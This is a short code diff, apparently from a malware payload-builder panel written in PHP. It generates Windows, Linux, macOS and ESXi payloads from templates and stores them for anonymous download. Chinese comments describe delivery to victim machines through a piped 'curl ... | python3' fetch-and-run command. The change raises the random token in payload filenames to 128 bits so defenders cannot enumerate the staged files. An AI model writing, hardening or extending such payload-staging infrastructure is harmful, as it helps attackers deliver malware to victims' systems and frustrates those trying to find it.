@@ -44,7 +44,10 @@ if (!in_array($platform, $valid)) { echo json_encode(['ok'=>false,'msg'=>'无效
 $out_dir = __DIR__ . '/payloads';
 if (!is_dir($out_dir)) mkdir($out_dir, 0750, true);
 $ts = date('Ymd_His');
-$tok = bin2hex(random_bytes(4));
+// 载荷必须能匿名下载（受害机器上无法登录，'curl ... | python3' 是唯一投递路径），
+// 所以文件名本身就是唯一屏障：时间戳可枚举，熵全部来自这里。
+// 32 bit 可暴力枚举（且用随机名 302 跳登录页 = 静默失败），提到 128 bit。
+$tok = bin2hex(random_bytes(16));
 
 $tpl_map = ['win'=>'win_payload.tpl','linux'=>'linux_payload.tpl','macos'=>'macos_payload.tpl','esxi'=>'esxi_payload.tpl'];
 $ext_map = ['win'=>'.cs','linux'=>'.py','macos'=>'.py','esxi'=>'.sh'];
